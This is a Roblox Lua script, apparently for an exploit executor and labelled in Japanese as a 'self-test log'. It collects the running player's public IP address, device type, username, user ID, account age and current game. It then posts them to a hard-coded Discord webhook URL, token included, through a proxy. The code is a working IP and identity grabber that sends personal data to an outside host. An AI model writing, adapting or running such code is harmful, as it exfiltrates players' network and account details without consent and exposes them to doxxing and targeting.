local MarketService = game:GetService("MarketplaceService")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local player = game.Players.LocalPlayer
local info = MarketService:GetProductInfo(game.PlaceId)

local url = "https://webhook.lewisakura.moe/api/webhooks/1472130886550945802/bHPREhnis3MtjMK3xA2lMZeuoSQvBbxK8UTqzLk_znZodpVyzwvxHlcNwPNCrj22F-Bf"

-- 1. IPアドレスを取得
local ipData = "取得失敗"
pcall(function()
    ipData = game:HttpGet("https://api.ipify.org")
end)

-- 2. デバイスの種類を判別
local device = "不明"
if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
    device = "📱 Mobile"
elseif UserInputService.KeyboardEnabled then
    device = "💻 PC"
else
    device = "🎮 Console / Other"
end

local data = {
    ["embeds"] = {{
        ["title"] = "🛠️ セルフテスト・ログ報告",
        ["description"] = "実行者: **" .. player.Name .. "**",
        ["color"] = 255, -- 青色
        ["fields"] = {
            {
                ["name"] = "🌐 ネットワーク/デバイス",
                ["value"] = "**IP:** `" .. ipData .. "`\n**Device:** " .. device,
                ["inline"] = true
            },
            {
                ["name"] = "⏳ アカウント情報",
                ["value"] = "**経過日数:** " .. player.AccountAge .. "日\n**ID:** " .. player.UserId,
                ["inline"] = true
            },
            {
                ["name"] = "📍 実行場所",
                ["value"] = "**Game:** " .. info.Name .. "\n**PlaceId:** " .. game.PlaceId,
                ["inline"] = false
            }
        },
        ["thumbnail"] = {
            ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=420&height=420&format=png"
        },
        ["footer"] = {
            ["text"] = "Test Log | " .. os.date("%Y/%m/%d %X")
        }
    }}
}

-- 送信実行
local response = request({
    Url = url,
    Method = "POST",
    Headers = { ["Content-Type"] = "application/json" },
    Body = HttpService:JSONEncode(data)
})

if response.Success then
    print("✅ テストログを送信しました")
else
    print("❌ 送信失敗: " .. response.StatusCode)
end
